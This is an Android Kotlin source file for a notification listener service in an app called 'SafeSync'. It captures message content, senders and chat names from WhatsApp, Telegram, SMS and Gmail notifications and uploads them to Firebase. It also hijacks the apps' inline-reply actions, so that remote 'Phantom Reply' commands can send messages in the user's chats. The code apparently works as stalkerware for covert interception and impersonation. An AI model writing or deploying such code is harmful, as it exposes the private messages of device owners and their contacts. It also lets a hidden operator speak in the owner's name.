package com.strix.safesync.services

import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.strix.safesync.data.FirebaseManager

import android.util.Log

class NotificationService : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d("SafeSyncPhantom", "NotificationService Connected")
        
        // Listen to Firebase for Phantom Reply commands (only if we're theoretically a client)
        FirebaseManager.listenForPhantomReplies { commandId, chatKey, messageText ->
            Log.d("SafeSyncPhantom", "Received reply command: $chatKey -> $messageText")
            val success = PhantomReplyCache.executeReply(applicationContext, chatKey, messageText)
            if (success) {
                FirebaseManager.markPhantomReplyDone(commandId)
            }
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn ?: return

        val pkg    = sbn.packageName
        val extras = sbn.notification.extras
        val title  = extras.getCharSequence("android.title")?.toString() ?: ""
        val text   = extras.getCharSequence("android.text")?.toString() ?: ""
        
        // --- PHANTOM REPLY INTERCEPTOR ---
        if (pkg.contains("whatsapp") || pkg.contains("telegram") || pkg.contains("messaging")) {
            val actions = sbn.notification.actions
            if (actions != null) {
                for (action in actions) {
                    val remoteInputs = action.remoteInputs
                    if (remoteInputs != null) {
                        for (remoteInput in remoteInputs) {
                            if (remoteInput.resultKey != null) {
                                // Cache the PendingIntent mapped by package name and title (usually the chat name)
                                val chatKey = "$pkg::$title"
                                PhantomReplyCache.saveReplyAction(chatKey, action.actionIntent, remoteInput)
                                Log.d("SafeSyncPhantom", "Intercepted Reply Action for: $chatKey")
                            }
                        }
                    }
                }
            }
        }
        // ---------------------------------

        // ── 1. MessagingStyle (WhatsApp / Telegram / SMS / etc.) ──────────────
        // android.messages is a Parcelable[] of Bundles, each with:
        //   "text"   → CharSequence – message body
        //   "sender" → CharSequence – sender display name (null for individual chats)
        //   "time"   → Long – timestamp
        val rawMessages = try {
            extras.getParcelableArray("android.messages")
        } catch (_: Exception) { null }

        if (!rawMessages.isNullOrEmpty()) {
            val subTexts = mutableListOf<String>()
            for (obj in rawMessages) {
                val bundle  = obj as? Bundle ?: continue
                val msgText = bundle.getCharSequence("text")?.toString() ?: continue
                // "sender" contains the group member's name; null/blank for 1-on-1 chats
                val sender  = bundle.getCharSequence("sender")?.toString()
                             ?: bundle.getString("sender")

                subTexts.add(
                    if (!sender.isNullOrBlank()) "👤 $sender: $msgText"
                    else msgText
                )
            }
            if (subTexts.isNotEmpty()) {
                FirebaseManager.uploadNotification(
                    packageName = pkg,
                    title       = title,          // group name or contact name
                    text        = subTexts.last(), // preview = most recent message
                    subTexts    = subTexts
                )
                return
            }
        }

        // ── 2. InboxStyle / BigInbox (Gmail summary, etc.) ────────────────────
        val textLines = extras.getCharSequenceArray("android.textLines")
        if (!textLines.isNullOrEmpty()) {
            val lines = textLines.map { it.toString() }
            FirebaseManager.uploadNotification(
                packageName = pkg,
                title       = title,
                text        = lines.last(),
                subTexts    = lines
            )
            return
        }

        // ── 3. BigText ────────────────────────────────────────────────────────
        val bigText = extras.getCharSequence("android.bigText")?.toString()
        if (!bigText.isNullOrBlank() && bigText != text) {
            FirebaseManager.uploadNotification(
                packageName = pkg,
                title       = title,
                text        = bigText,
                subTexts    = listOf(bigText)
            )
            return
        }

        // ── 4. Default ────────────────────────────────────────────────────────
        if (title.isNotBlank() || text.isNotBlank()) {
            FirebaseManager.uploadNotification(
                packageName = pkg,
                title       = title,
                text        = text,
                subTexts    = emptyList()
            )
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
